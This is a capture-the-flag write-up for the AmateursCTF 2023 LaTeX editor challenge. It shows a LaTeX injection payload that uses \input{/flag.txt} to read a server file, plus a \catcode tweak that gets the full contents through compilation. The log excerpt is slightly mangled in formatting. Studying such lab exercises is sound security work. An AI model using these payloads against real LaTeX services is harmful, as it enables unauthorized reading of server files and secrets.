## Details
- Platform: [AmateursCTF](/categories/amateursctf/)
- Event: [AmateursCTF 2023](/tags/amateursctf2023/)

## Setting

The challenges context is as follows:

> bryanguo (not associated with the ctf), keeps saying it's pronouced latek not latex like the glove material. anyways i made this simple app so he stops paying for overleaf.

[Overleaf](https://www.overleaf.com/) is a popular LaTeX editor. Probably with less security issues too.

Let's try to find this LaTeX editors vulnerability, and convice Bryanguo to invest in a secure LaTeX editor!

## Walkthrough
In the challenge description, we are told that `/flag.txt` is the only place we can find the flag.

Let's try using a LaTeX payload to read the contents of the file.

You can find a bunch of LaTeX payloads in the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection) repository.

In this case, we use the `\input{/some/file.txt}`.

The full code entered into the LaTeX editor is as follows.

```latex
\documentclass{article}

\begin{document}

\input{/flag.txt}

\end{document} 

```

In this editor, we can conveniently see the logs right below the pdf preview pane.

After entering the above LaTeX code into the editor, this is the output for the logs that we get.

!  ==> Fatal error occurred, no output PDF file produced!
```

You can see that we have almost got the flag with just a simple payload injection.

But there seems to be an error that is stopping us from getting the entire flag.

We can see this error in the logs, and also the pdf preview is not loading.

The LaTeX error provided in the logs indicates that there is an issue with math mode in the document. The error message specifically states:

```latex
! Missing $ inserted.
<inserted text>
                $
l.1 amateursCTF{th3_
                    l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3...
```

This error occurs when you try to use math symbols or math-related commands without entering math mode. In LaTeX, you need to enter math mode to use special math symbols, equations, or related commands. Math mode is typically entered using either single dollar signs `$ ... $` for inline math mode or double dollar signs `$$ ... $$` for displayed math mode.

It seems like it thinks we are trying to use math mode, but the math delimiters (`$`) are missing, and the error message is pointing to the line where the issue is located.

One thing we could try is to change the category code of some of these special math mode control characters to normal characters.

After trying to essentailly deactivate these control characters (`$`, `#`, `_`, `&`) I found that the underscore control character (`_`) was the issue.

Therefore, we can add "\\catcode \`\\\_=12" to the LaTeX code!

```latex

\documentclass{article}

\begin{document}

\catcode `\_=12

\input{/flag.txt}

\end{document} 
```

In LaTeX, the command `\catcode` is used to change the category code of a character. The category code of a character determines how LaTeX treats that character when it appears in the document. For example, the category code of the underscore character `_` is typically set to 8, which means it is treated as a subscript character in math mode.

"\\catcode \`\\\_=12" changes the category code of the underscore character (`_`) to 12. 

In TeX (the underlying typesetting engine of LaTeX), category code 12 means that the character is treated as an "other" character, similar to regular alphanumeric characters.

By setting the underscore's category code to 12, it becomes a regular character and can be used in normal text mode without causing any issues or errors. 

Now the error disapears and we get the full flag!
